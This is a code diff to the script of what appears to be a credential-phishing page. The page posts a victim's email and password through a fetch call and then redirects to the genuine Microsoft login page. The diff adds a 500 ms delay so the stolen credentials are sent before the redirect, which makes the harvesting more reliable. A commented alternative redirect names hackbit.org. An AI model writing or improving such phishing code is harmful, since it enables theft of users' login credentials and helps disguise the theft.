@@ -73,14 +73,16 @@
                     email: email,
                     password: password
                 })
-            }).then(function(response) {
-                // Redirect after the data has been sent
-                window.location.href = 'https://login.microsoftonline.com/';
-                // Alternatively, redirect to 'https://hackbit.org/'
-                // window.location.href = 'https://hackbit.org/';
             }).catch(function(error) {
                 console.error('Error:', error);
             });
+
+            // Set a short delay before redirecting to allow the fetch call to be sent
+            setTimeout(function() {
+                window.location.href = 'https://login.microsoftonline.com/';
+                // Alternatively, redirect to 'https://hackbit.org/'
+                // window.location.href = 'https://hackbit.org/';
+            }, 500); // 500 milliseconds delay
 
         });
     </script>
